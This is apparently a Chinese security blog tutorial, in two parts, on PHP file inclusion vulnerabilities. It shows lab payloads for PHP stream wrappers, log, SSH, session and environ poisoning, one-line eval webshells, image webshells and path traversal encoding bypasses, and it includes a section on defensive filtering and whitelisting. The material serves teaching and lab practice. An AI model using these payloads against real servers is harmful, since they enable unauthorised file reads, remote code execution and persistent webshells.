当然里不单单只能读取当前目录下的文件，这里就演示一下另外一种读取方式，我将文件放在上一级目录中，通过php进行读取。 URL：http://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=../2.php 仔细看URL连接就能看出来，这里使用了之前提到的相对路径读取。 其中filter伪协议内置了很多过滤器，有字符串过滤器，转换过滤器、压缩过滤器、加密过滤器等 用法： ?page=php://filter/read=convert.base64-encode/resource=file1.php 1、调整DVWA的安全级别，并进入文件包含里面： 2、使用php://协议进行文件包含file1.php，可以看到，已经返回了包含文件的base64加密源码： 这个协议的含义为：通过php协议读取本地敏感文件的源代码，对读取的的文件进行base64加密，并返回加密后的文件内容。 解密得到源码 4、通过目录穿越的方法读取index.php文件： ?page=php://filter/read=convert.base64-encode/resource=../../index.php 一般我们是在已知网站结构路径的前提下，获取网站的源代码。 file:// file:// — 访问本地文件系统, file其实和绝对路径读取差不多。 URL：http://192.168.10.150/1.php/?name=file://C:/Windows/win.ini 靶场源码： &lt;?php // The page we wish to display $file = $_GET[ 'page' ]; //定义一个变量，通过GET的请求方式接收我们包含的文件； // Input validation if( !fnmatch( \"file*\", $file ) &amp;&amp; $file != \"include.php\" ) { //如果通过get方式传递过来的参数字符串中，开头没有以file*开头的字符串，并且不能包含include.php文件； //语法:fnmatch(pattern,string,flags)： //pattern 必需。规定要检索的模式； //string 必需。规定要检查的字符串或文件。 echo \"ERROR: File not found!\"; 则输出文件未发现，并且退出 exit; } ?&gt; 校验流程：通过GET的请求方式接收包含的文件--&gt;如果通过get方式传递过来的参数字符串中，开头没有以file*开头的字符串，并且不能包含include.php文件--&gt;则输出文件未发现，并且退出 利用条件： file:// 用于访问本地文件系统，且不受allow_url_fopen与allow_url_include的影响。 用法： ?page=file:///文件绝对路径 1、调整DVWA的安全级别，并进入文件包含里面： 2、使用本地文件包含，没有发现文件： 注：通过上面源码我们发现，只要传入的参数的没有以file开头的字符，则输出文件未发现，并且退出。 3、这里我们通过file:///协议进行绕过，发现可以访问host文件： 我们包含：file:///C:\\Windows\\System32\\drivers\\etc\\hosts http: // 其实http这里的利用方式，除了能够跳转，还能进行远程包含进行漏洞执行。 URL：http://192.168.10.150/1.php/?name=http://www.baidu.com data: // 从php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行任意代码。 这里需要注意若使用data的话需要allow_url_include 和allow_url_fopen为on。 利用条件： 和php伪协议的input类似，也可以执行任意代码，但利用条件和用法不同。 条件：allow_url_fopen参数与allow_url_include都需开启。 #用法1： ?page=data:text/plain,&lt;?php 执行内容 ?&gt; #用法2： ?page=data:text/plain;base64,编码后的php代码 1、使用用法1执行代码： 执行内容： &lt;?php system(whoami);?&gt; 2、使用用法2执行代码： 执行内容： &lt;?php system(whoami);?&gt; 注：经base64编码后的加号和等号要手动的url编码，以免浏览器识别不了。 对执行内容进行base64加密： 可以看到系统命令已经执行成功： ftp://和ftps:// ftp:// – ftps:// — 访问 FTP(s) URLs zip:// 可以访问压缩包里的文件。当他与包含函数结合时，zip://流会被当做php文件执行。 下面是针对某些封装协议的利用方式和特点 利用条件： zip://可以访问压缩文件中的文件。 条件： 使用zip协议，需要将#编码为%23，所以需要PHP 的版本 &gt;=5.3.0，要是因为版本的问题无法将#编码成%23，可以手动把#改成%23。 用法： ?page=zip://[压缩文件路径]#[压缩文件内的子文件名] 1、将靶机网站主目录下的1.php，压缩成1.zip压缩包： 内容： &lt;?php phpinfo();?&gt; 2、通过zip://伪协议对它进行文件包含： 注：要是把压缩包的后缀改为其他任意格式的文件也可以正常使用 compress.bzip2:// 用法： ?file=compress.bzip2://D:/soft/phpStudy/www/file.bz2 【or】 ?file=compress.bzip2://./file.bz2 compress.zlib:// ?file=compress.zlib://D:/soft/phpStudy/www/file.gz 【or】 ?file=compress.zlib://./file.gz phar:// 利用条件： 与zip://协议类似，但用法不同，zip://伪协议中是用#把压缩文件路径和压缩文件的子文件名隔开，而phar://伪协议中是用/把压缩文件路径和压缩文件的子文件名隔开。 用法： ?page=phar://[压缩文件路径]/[压缩文件内的子文件名] 使用phar://对1.zip文件进行文件包含： 1.7文件包含日志读取 日志会记录客户端请求及服务器响应的信息，访问http://www.xx.com/时，也会被记录在日志里，也可以插入到User-Agent，但是请求的信息有可能被url编码之后记录日志，这里可以通过burp来发送请求包来防止被编码，通过相对路径找到日志文件，利用包含漏洞执行。各类日志存在位置 1.1 漏洞原理 当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。 Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。 1.2 利用方法 通过日志文件getshell： 1.通过burpsuite发送的请求包产生日志数据； 2.包含日志文件； 3.写入一句话木马getshell 1.3 Apache apache存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。 1）Windows系统： apache安装目录/logs/access.log或者error.log 2）linux系统： /var/log/apache/access.log或者error.log /var/log/apache2/access.log或者error.log /etc/httpd/logs/access_log或者error.log 实操： 1. 日志文件路径： D:\\labwork\\phpstudy_pro\\Extensions\\Apache2.4.39\\logs 这里主要查看access.log这个日志，这个日志记录着服务器所有的访问记录，包括一些攻击流量： 2. 没有access.log访问日志的原因： 进入日志目录下，如果发现没有access.log这个访问日志，是因为apache配置文件没有打开这个配置选项，需要对相应的功能进行开启。 3. 开启access.log访问日志功能： 1、通过配置文件的开启access.log访问日志功能： 2、搜索CustomLog \"logs/access.log\" common，将前面的##注释去掉，并保存文件，然后重启PHPstudy: 3、查看访问日志文件，日志目录下已经出现这个文件，说明成功开启访问日志功能： 4、访问几个网页，查看记录，对自己访问的页面有记录，说明access.log可以自动记录访问操作： 实操过程： 1、我们通过访问，让访问日志记录我们的phpinfo();代码，可以看出，访问日志已经成功记录了我们的访问历史： 访问内容： &lt;?php phpinfo();?&gt; 注：通过上图我们可以看出，日志已经成功记录我们的访问历史，但是是经过URL编码后的结果。如何让它记录我们原始完整的代码呢？一般URL编码是我们的浏览器进行完成的，它对我们访问的目录做了URL编码，然后发送到服务器，我们可以通过burpsuite，把经过浏览器URL编码后的数据进行修改。 2、使用burpsuite修改编码后的数据： 3、查看访问日志，可以看出，没有编码的phpinfo();代码已经成功记录： 4、文件包含只要文件中有php代码，它就会把这个文件当做php脚本进行解析，这样我们可以包含这个日志文件，让目标服务器把日志文件解析为php脚本；可以看出，已经成功解析日志文件为php脚本： 5、让访问日志文件记录下写入文件脚本代码： 访问内容： &lt;?php $file=fopen('test1.php','w');fputs($file,'&lt;?php @eval($_POST[1]);?&gt;');?&gt; 6、对访问日志进行文件包含，并查看创建的一句话脚本，已经创建成功： 这里不知为何老是被截断，说是有特殊字符或者长度过长，我不理解，就先学个思路吧 下面是成功者的图片 7、使用蚁剑连接webshell，成功获得靶机的webshell权限： 1.4 Nginx nginx存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。 1）Windows系统： nginx安装目录/logs/access.log或者error.log 2）linux系统： /var/log/nginx/access.log或者error.log 1.5 IIS 1）iis6.0版本 C:\\windows\\system32\\LogFiles 2）iis7.5版本 %SystemDrive%\\inetpub\\logs\\LogFiles 1.6 包含Apache日志案例 Apache运行后一般默认会生成两个日志文件，access.log(访问日志)，error.log(错误日志)。 下图就是被转码的，只需要手动修改一下重新发送即可。(这里的转码就不叙述了, 上述有: 1.5.6 远程文件读取) URL：http://192.168.10.150/&lt;?php @eval($_POST[123]);?&gt; 通过对本地的日志文件进行包含读取，输入123=phpinfo();。 URL:http://192.168.10.150/1.php/?name=../Apache/logs/error.log POST: 123 = phpinfo(); 当然也可以使用蚁剑来进行连接。 URL：http://192.168.10.150/1.php/?name=../Apache/logs/error.log 连接密码：123 1.8文件包含漏洞攻击防范 ​ 文件包含漏洞已经是Web安全史上经常用的攻击手段，且它的利用方式简单，造成的危害巨大，虽然我们现在已经有了很全面的防范对策，但是它的危害还是很大，上述实验我己经从多种角度解析了文件包含漏洞，也阐述了它可以做的事情已经造成的危害，下面我们开始着重介绍怎么对此漏洞进行防范和检测，避免造成不必要的损失。 0x01检查服务器配置文件 ​ 在php中有个php.ini的配置文件，里面大概是对php语言所有功能配置文件集合，其中里面有两项是allow_url_fopen、allow_url_include两个选项，其中allow_url_fopen默认是开启的，allow_url_include默认是关闭的，如果我们开启这个配置文件，我们就可以使用伪协议读取我们的敏感信息和其它操作，虽然开启allow_url_fopen也可以读取我们的文件，但是我们可以通过过滤一些字符或者限制用户的输入从而达到攻击者不能读取我们信息的操作。 0x02过滤特殊符号 ​ 在进行文件包含的时候我们可能经常会用到几个固定的字符，或者我们在用伪协议的时候我们也会使用特定的字符，例如：\\，//，input，output，filter等我们可以将这些铭感字符都给过滤掉。代码如下 &lt;?php show_source(__FILE__); $file = $_GET['file']; $file = str_replace( array( \"http://\",\"file://\"), \"\",$file); $file = str_replace( array(\"../\", \"..\\\"\"), \"\",$file); $file = str_replace( array(\"/\", \"\\\\\"), \"\",$file); include $file; ?&gt; 此时我们再用我们之前的攻击手法，发现已经读取不到文件了。 因为str_repleace只会替换一次，可以有办法绕过的，所以这里我们还有正则匹配的方式，只要用户输入的字符串被我们正则匹配我们就会警告结束程序的运行。我们来看下我们的源码。 &lt;?php show_source(__FILE__); $file = $_GET['file']; if(preg_match(\"/..\\/|http|ftp|\\/|\\/\\//\", $file)){ echo \"不合法字符\"; }else{ include $file; } 0x03指定包含的文件 （白名单） ​ 我们在做网站开发的时候我们可能经常会使用我们文件包含的函数，但是我们呢包含的文件都是我们指定的文件，也就是我们知道我们需要包含什么文件。这样，我们在包含文件的时候就可以添加一条规则，让我们只能包含指定的文件，如果我们包含了非指定的文件，程序就会报错退出。下面来看下我们实现的方法。 &lt;?php show_source(__FILE__); $file = $_GET['file']; if($file != \"flag.php\"){ echo \"Error!\"; die(); } 0x04设置文件目录 ​ php的配置文件中有open_basedir选项可以设置用户需要执行的文件目录，如果设置文件目录的话，我们编写的脚本只会在该目录中搜索文件，这样我们就可以把我们需要包含的文件放到这个目录就可以了，从而也避免了敏感文件的泄露。 漏洞修复 首先是无解的WAF产品 固定后缀：添加文件后缀到所包含的文件名。实战情况下不清楚所添加的后缀，未知将在造成更多的疑虑，但是可以测一测 固定文件：似与C语言头文件，不进行所包含文件的修改，都定下来。 对可变的所包含文件名进行检测！ 一般java的站点存在文件系列的洞比较多(除了文件包含)。","categories":["常见top漏洞"]},{"title":"浅析文件包含","path":"/2023/08/07/qian-xi-wen-jian-bao-han/","content":"文件包含总结 0x01 文件包含的概念： 把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，无需再次编写函数。这一调用文件的过程被称为包含。 1.1 文件包含的原理： 文件包含漏洞产生的原因是在通过PHP函数引入文件时，由于传入的文件名没有经过合理的校验，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。 1.2 文件包含分类： 文件包含分为本地文件包含和远程文件包含，而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_ url_ include. 如果开启就有可能包含远程文件。远程文件包含需要php.ini中allow_ ur_ include=on, allow_ ur_ fopen = On。在php.ini中，allow_ url_ fopen默认一直是On,而allow_ url_ include从php5.2之后就默认为Off。 本地文件包含：包含服务器上的资源 //能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞（LFI）。 远程文件包含：通过HTTP协议包含其他地方的资源 1.3 文件包含函数： 1, include():找不到被包含文件时会产生警告(E_ WARNING) ; 2，include_ once(): 与include () 类似，代码已经被包含则不会再次包含 3，require():找不到被包含的文件时会产生致命错误(E_ COMPILE ERROR) 4，require_ once():与require ()类似，代码已经被包含则不会再次包含 思维导图： 0x02 PHP伪协议： PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。 2.1 php://input php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。 poc： ?file=php://input [POST DATA] &lt;?php phpinfo();?&gt; 注：利用php://input还可以写入php木马,即在post中传入如下代码： &lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?&gt;');?&gt; 例子： //test.php &lt;?php show_source(__FILE__); include('flag.php'); $a= $_GET[\"a\"]; if(isset($a)&amp;&amp;(file_get_contents($a,'r')) === 'I want flag'){ echo \"success \"; echo $flag; } //flag.php &lt;?php $flag = 'flag{flag_is_here}'; ?&gt; 审计test.php知，当参数$a不为空，且读取的文件中包含’I want flag’时，即可显示$flag。所以可以使用php://input得到原始的post数据,访问请求的原始数据的只读流,将post请求中的数据作为PHP代码执行来进行绕过。 注：遇到file_get_contents()要想到用php://input绕过。 2.2 php://filter php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致任意文件读取。 前缀名称 后加内容 描述 resource= 要过滤的数据流 指定要过滤的数据流 read= 读链的筛选器列表 参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔 write= 写链的筛选器列表 参数可选，可设定一个或者多个筛选器名称，以管道符（|）分隔 空 两个链的筛选器列表 没有用read=或者write=做前缀的筛选器列表会是轻快应用于读或者写 poc1: ?file=php://filter/resource=xxx.php poc2: ?file=php://filter/read=convert.base64-encode/resource=xxx.php 为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里 就会用到php://filter。 php://filter读取文件源代码的时候 需要用到编码器 php://filter/resource=phpinfo.php php://filter/read=convert.base64-encode/resource=phpinfo.php php://filter 一般读取文件源代码，然后再进行审计 php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。 可以直接用不带任何过滤器的filter伪协议 payload:file=php://filter/resource=flag.php 也可以用一些没有过滤掉的编码方式和转换方式 payload:file=php://filter/read=convert.quoted-printable-encode/resource=flag.php payload:file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php 怎么写入一句话木马? $filename = $_GET['file']; $content = $_GET['content']; file_put_contents($filename,\"&lt;?php exit();\".$content); exit() 退出程序 这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配 置文件等等不允许用户直接访问的文件当中。 exit死亡绕过参考：https://xz.aliyun.com/t/8163 POC1直接读取xxx.php文件，但大多数时候很多信息无法直接显示在浏览器页面上，所以需要采取POC2中方法将文件内容进行base64编码后显示在浏览器上，再自行解码。 注：更多php://filter用法可参考：谈一谈php://filter的妙用 eg1: &lt;meta charset=\"utf8\"&gt; &lt;?php error_reporting(0); $file = $_GET[\"file\"]; if(stristr($file,\"php://input\") || stristr($file,\"zip://\") || stristr($file,\"phar://\") || stristr($file,\"data:\")){ exit('hacker!'); } if($file){ include($file); }else{ echo '&lt;a href=\"?file=flag.php\"&gt;tips&lt;/a&gt;'; } ?&gt; 尝试payload：?file=php://filter/resource=flag.php，发现无法显示内容： 尝试payload：?file=php://filter/read=convert.base64-encode/resource=flag.php，得到一串base64字符，解码得flag在flag.php源码中的注释里： 2.3 zip:// zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。 zip://中只能传入绝对路径。(php版本大于等于php5.3.0) 要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换） 只需要是zip的压缩包即可，后缀名可以任意更改。 相同的类型的还有zlib://和bzip2:// file=compress.zlib://flag.php poc: zip://[压缩包绝对路径]#[压缩包内文件] ?file=zip://D:\\zip.jpg%23phpinfo.txt 例子： //index.php &lt;meta charset=\"utf8\"&gt; &lt;?php error_reporting(0); $file = $_GET[\"file\"]; if (!$file) echo '&lt;a href=\"?file=upload\"&gt;upload?&lt;/a&gt;'; if(stristr($file,\"input\")||stristr($file, \"filter\")||stristr($file,\"data\")/*||stristr($file,\"phar\")*/){ echo \"hick?\"; exit(); }else{ include($file.\".php\"); } ?&gt; &lt;!-- flag在当前目录的某个文件中 --&gt; //upload.php &lt;meta charset=\"utf-8\"&gt; &lt;form action=\"upload.php\" method=\"post\" enctype=\"multipart/form-data\" &gt; &lt;input type=\"file\" name=\"fupload\" /&gt; &lt;input type=\"submit\" value=\"upload!\" /&gt; &lt;/form&gt; you can upload jpg,png,zip....&lt;br /&gt; &lt;?php if( isset( $_FILES['fupload'] ) ) { $uploaded_name = $_FILES[ 'fupload' ][ 'name' ]; //文件名 $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); //文件后缀 $uploaded_size = $_FILES[ 'fupload' ][ 'size' ]; //文件大小 $uploaded_tmp = $_FILES[ 'fupload' ][ 'tmp_name' ]; // 存储在服务器的文件的临时副本的名称 $target_path = \"uploads\\\\\".md5(uniqid(rand())).\".\".$uploaded_ext; if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" || strtolower( $uploaded_ext ) == \"zip\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) { if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {// No echo '&lt;pre&gt;upload error&lt;/pre&gt;'; } else {// Yes! echo \"&lt;pre&gt;\".dirname(__FILE__).\"\\\\{$target_path} succesfully uploaded!&lt;/pre&gt;\"; } } else { echo '&lt;pre&gt;you can upload jpg,png,zip....&lt;/pre&gt;'; } } ?&gt; //传参的时候利用上面的poc，此时会成功绕过，并且执行phpinfo.txt文件里的代码（被当做php代码执行） 2.4 data://与phar:// data:// 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。(这是一个输入流执行的协议，它可以向服务器输入数据，而服务器也会执行。) 利用条件: php版本大于等于php5.2 allow_url_fopen = On allow_url_include = On poc:若纯文字没用可用[base64编码] data://[&lt;MIME-type&gt;][;charset=&lt;encoding&gt;][;base64],&lt;data&gt; ?file=data://,&lt;?php phpinfo();?&gt; ?file=data://text/plain,&lt;?php phpinfo();?&gt; ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ ?file=data:text/plain,&lt;?php phpinfo();?&gt; ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+ phar:// 有点类似zip://同样可以导致 任意代码执行。 phar://中相对路径和绝对路径都可以使用 利用条件： php版本大于等于php5.3.0 poc: 假设有个文件phpinfo.txt，其内容为&lt;?php phpinfo(); ?&gt;，打包成zip压缩包，如下： 指定绝对路径 index.php?file=phar://D:/phpStudy/WWW/fileinclude/test.zip/phpinfo.txt 或者使用相对路径（这里test.zip就在当前目录下） index.php?file=phar://test.zip/phpinfo.txt 2.5 expect://伪协议 expect://伪协议用来执行系统命令，但是需要安装拓展 用法: ?file=expect://ls 0x03 特殊文件包含 服务器的中间件，ssh服务都有日志记录的功能。如果开启了日志记录功能，用户访问的日志就会存储到不同服务的相关文件。 如果日志文件的位置是默认位置或者是可以通过其他方法获取，就可以通过访问日志将恶意代码写入到日志文件中去，然后通过文件包含漏洞包含日志中的恶意代码，获得权限。 典型的日志文件包含： 中间件日志文件包含 ssh日志文件包含 中间件日志文件包含 利用条件： web中间件日志文件的存储位置已知，并且具有可读权限 下面开始介绍日志文件包含漏洞利用步骤 1. 将恶意代码写入到日志文件 中间件开启了访问日志记录功能，会访问日志写入到日志文件中。 假设访问URL：http://192.168.1.2/xxx/index.php 发现会在日志文件中有如下内容： [root@aaa]#less /var/log/httpd/access_log 192.168.1.200 - - [09/Aug/2021:19:31:20 +0800] \"GET /xxx/index.php HTTP/1.1\" 200 86.... 中间件日志访问会记录访问者的IP地址、访问时间、访问路径、返回状态码等等。 利用中间件访问记录路径到日志文件中的功能，将恶意代码写入到日志文件当中去： 添加恶意代码：http://www.abc.com/xxx/&lt;?php @eval($_POST[123]);?&gt; 此时会提示404，但是不急 查看日志文件，发现已经将内容写入 [root@aaa]#less /var/log/httpd/access_log 192.168.1.200 - - [09/Aug/2021:19:35:23 +0800] \"GET /xxx/%3C?php @eval($_POST[123]);?%3E HTTP/1.1\" 404 826.... 虽然已经写入到日志文件中去了，但是浏览器进行了URL编码，导致传入的代码不能正常使用 可以通过burpsuite抓包的方式写入恶意代码，这样不会被浏览器进行URL编码 查看日志文件，内容如下 [root@aaa]#less /var/log/httpd/access_log 192.168.1.200 - - [09/Aug/2021:19:37:33 +0800] \"GET /xxx/&lt;?php @eval($_POST[123]);?&gt; HTTP/1.1\" 404 302.... 恶意代码成功写入 2. 文件包含日志文件 要执行文件包含，必须要知道日志文件的位置。 常见的中间件日志文件都有默认的存储路径，比如Apache的中间件日志文件存在/var/log/httpd/目录下，文件名叫access_log 输入测试语句http://www.abc.com/xxx/file.php?file=../../../var/log/httpd/access_log 之后在向网页传入POST参数：123=phpinfo 即可显示出phpinfo的内容 3.1 包含Apache日志文件 WEB服务器一般会将用户的访问记录保存在访问日志中。那么我们可以根据日志记录的内容，精心构造请求，把PHP代码插入到日志文件中，通过文件包含漏洞来执行日志中的PHP代码。 利用条件： 对日志文件可读 知道日志文件的存储目录 注意： 一般情况下日至存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx.conf....)或者根据phpinfo()中的信息来得知 日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式 Apache运行后一般默认会生成两个日志文件，Windos下是access.log（访问日志）和error.log(错误日志)，Linux下是access_log和error_log，访问日志文件记录了客户端的每次请求和服务器响应的相关信息。 如果访问一个不存在的资源时，如http://www.xxxx.com/,则会记录在日志中，但是代码中的敏感字符会被浏览器转码，我们可以通过burpsuit绕过编码，就可以把 写入apache的日志文件，然后可以通过包含日志文件来执行此代码，但前提是你得知道apache日志文件的存储路径，所以为了安全起见，安装apache时尽量不要使用默认路径。 参考文章：1.包含日志文件getshell 2.一道包含日志文件的CTF题 这里提供一道包含日志的CTF题目：SHACTF-2017- Bon Appétit (100)-writeup 3.2 包含SSH log日志文件 利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log 下面介绍漏洞利用步骤 1. 将恶意代码写入文件 SSH如果开启了日志记录的功能，那么会将ssh的连接日志记录到ssh日志文件当中 将连接的用户名设置成恶意代码，用命令连接受害者的服务器ip(192.168.1.1)的ssh服务 ssh \"&lt;?php @eval($_POST[123]);?&gt;\"@192.168.1.1 查看日志文件/var/log/auth.log，可以观察到恶意代码已经写入到日志文件 2. 使用文件包含日志文件 测试输入语句：http://192.168.1.1/xxx/file.php?file=../../../var/log/auth.log 之后再向网页传入POST参数：123=phpinfo 就可以出现phpinfo的内容了 参考：[RCE with LFI and SSH Log Poisoning] 3.3 包含environ 利用条件： php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 姿势： proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。 可以参考这个： The proc/self/environ Injection shell via LFI - proc/self/environ method 3.4 包含fd 与前面的方法类似/proc/self/environ，可以将代码引入 proc 日志文件中，这些代码可以通过易受攻击的 LFI 脚本执行。通常，您会使用 burp 或 curl 将 PHP 代码注入到referer. 这种方法有点棘手，因为包含 Apache 错误日志信息的 proc 文件在/proc/self/fd/等下发生了变化/proc/self/fd/2。我建议使用 Burp Intruder + FuzzDB 的LFI-FD/proc/self/fd/10暴力破解 /proc/self/fd/ 目录的目录结构-Check.txt可能的 proc 文件列表，然后您可以监控返回的页面大小并进行调查。 参考： LFI Cheat Sheet：/proc/self/environ LFI Method 3.5 包含SESSION 可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。 利用条件： 找到Session内的可控变量 Session文件可读写，并且知道存储路径 一般通过以下两种方式获取session的存储位置： 通过phpinfo的信息获取session的存储位置。 通过phpinfo的信息获取session.save_path 通过猜测默认的session存储位置进行尝试 通常Linux中的Session的默认存储位置在/var/lib/php/session目录下 php的session文件的保存路径可以在phpinfo的session.save_path看到。 session常见存储路径： /var/lib/php/sess_PHPSESSID /var/lib/php/sess_PHPSESSID /tmp/sess_PHPSESSID /tmp/sessions/sess_PHPSESSID session文件格式： sess_[phpsessid] ，而 phpsessid 在发送的请求的 cookie 字段中可以看到。 参考文章：一道SESSION包含的CTF题 示例分析： session文件包含代码如下 session_start(); $ctfs=$_GET['ctfs']; $_SESSION['username']=$ctfs 此代码可以通过GET型的ctfs参数传入。PHP代码将会获取的值存入到Session中。 攻击者可以利用ctfs参数将恶意代码写入到session文件中，然后在利用文件包含漏洞包含此session文件，向系统中传递恶意代码。 漏洞分析 上面的代码满足Session文件包含的两个要求 PHP代码将会获取ctfs变量的值存入到session中 Session的默认 存储位置是/var/lib/php/session 访问URL：http://www.abc.com/xxx/session.php?ctfs=a 会在/var/lib/php/session目录下降ctfs传入的值存储到session中 Session的文件名以sess_开头，后跟Sessionid，Sessionid可以通过开发者模式获取： 单击右键——检查——存储——Cookie——PHPSESSID 就可以找到内容 假设通过开发者模式获取到的sessionid的值为hufh7hsdf392eurh4,所以session的文件名为sess_hufh7hsdf392eurh4 在/var/lib/php/session目录下查看此文件，内容为：username|s:4:“a” 漏洞利用 通过上面的分析，可以得知，向ctfs参数传入的内容会存储到session文件中。 如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到Session文件当中去，然后通过文件包含漏洞执行getshell 例如：访问代码http://www.abc.com/xxx/session.php?ctfs=&lt;?php phpinfo();?&gt;后，会在/var/lib/php/session目录下降ctfs的值写入session文件 session文件的内容为：username|s:18:\"&lt;?php phpinfo();?&gt;\". 攻击步骤 将恶意代码写入session文件 攻击者可以通过PHPinfo或者猜测到session存放的位置 通过开发者模式可以获得文件名称 通过本地文件包含漏洞可以解析session文件达到攻击的目的 比如：http://www.abc.com/xxx/file.php?file=../../var/lib/php/session/sess_7sdfysdfywy9323cew2 3.6 包含临时文件 php中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用c:\\winsdows\\temp目录。在临时文件被删除之前，利用竞争即可包含该临时文件。 由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的随机函数有缺陷，而window下只有65535中不同的文件名，所以这个方法是可行的。 另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。这个方法可以参考[LFI With PHPInfo Assistance](https://www.insomniasec.com/downloads/publications/LFI With PHPInfo Assistance.pdf) 类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题：XMAN夏令营-2017-babyweb-writeup 3.7 包含上传文件 很多网站通常会提供文件上传功能，比如：上传头像、文档等，这时就可以采取上传一句话图片木马的方式进行包含。 图片马的制作方式如下，在cmd控制台下输入： 进入1.jph和2.php的文件目录后，执行： copy 1.jpg/b+2.php 3.jpg 将图片1.jpg和包含php代码的2.php文件合并生成图片马3.jpg 假设已经上传一句话图片木马到服务器，路径为/upload/201811.jpg 图片代码如下： &lt;?fputs(fopen(\"shell.php\",\"w\"),\"&lt;?php eval($_POST['pass']);?&gt;\")?&gt; 然后访问URL：http://www.xxxx.com/index.php?page=./upload/201811.jpg，包含这张图片，将会在index.php所在的目录下生成shell.php 3.8 其他包含姿势 包含SMTP(日志) 包含xss 0x04 绕过方法 4.1 指定前缀绕过 4.1.1 目录遍历 使用 …/…/ 来返回上一目录，被称为目录遍历(Path Traversal)。例如 ?file=…/…/phpinfo/phpinfo.php 测试代码如下： &lt;?php error_reporting(0); $file = $_GET[\"file\"]; //前缀 include \"/var/www/html/\".$file; highlight_file(__FILE__); ?&gt; 现在在/var/log目录下有文件flag.txt，则利用…/可以进行目录遍历，比如我们尝试访问： include.php?file=../../log/flag.txt 则服务器端实际拼接出来的路径为：/var/www/html/…/…/log/test.txt，即 /var/log/flag.txt，从而包含成功。 4.1.2 编码绕过 服务器端常常会对于…/等做一些过滤，可以用一些编码来进行绕过。 1.利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ ..\\ %2e%2e%5c ..%5c %2e%2e\\ 2.二次编码 ../ %252e%252e%252f ..\\ %252e%252e%255c 3.容器/服务器的编码方式 ../ ..%c0%af 注：Why does Directory traversal attack %C0%AF work? %c0%ae%c0%ae/ 注：java中会把”%c0%ae”解析为”\\uC0AE”，最后转义为ASCCII字符的”.”（点） Apache Tomcat Directory Traversal ..\\ ..%c1%9c 注：那里的超链接是：Why does Directory traversal attack %C0%AF work? 4.2 指定后缀绕过 后缀绕过测试代码如下，下述各后缀绕过方法均使用此代码： &lt;?php error_reporting(0); $file = $_GET[\"file\"]; //后缀 include $file.\".txt\"; highlight_file(__FILE__); ?&gt; 4.2.1 利用url 在远程文件包含漏洞（RFI）中，可以利用query或fragment来绕过后缀限制。 可参考此文章：URI’s fragment 完整url格式： protocol :// hostname[:port] / path / [;parameters][?query]#fragment query(?) [访问参数] ?file=http://localhost:8081/phpinfo.php? [拼接后] ?file=http://localhost:8081/phpinfo.php?.txt 上述可能是?截断： ?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数而被丢弃，成功读取getshell如下： 空格绕过 这里也是一样需要使用编码%20进行绕过，不能直接输入空格。 ?file=http://localhost:8081/phpinfo.php%20.txt #号绕过： ?file=http://localhost:8081/phpinfo.php%23.txt 注：这里需要对#进行url编码，#的url编码为%23 Example：（设在根目录下有flag2.txt文件） fragment(#) [访问参数] ?file=http://localhost:8081/phpinfo.php%23 [拼接后] ?file=http://localhost:8081/phpinfo.php#.txt Example：（设在根目录下有flag2.txt文件） 其他绕过方式： 一些常见的特殊字符URL编码： 这里可以用burp爆破一遍，看哪个能用 4.2.2 利用协议 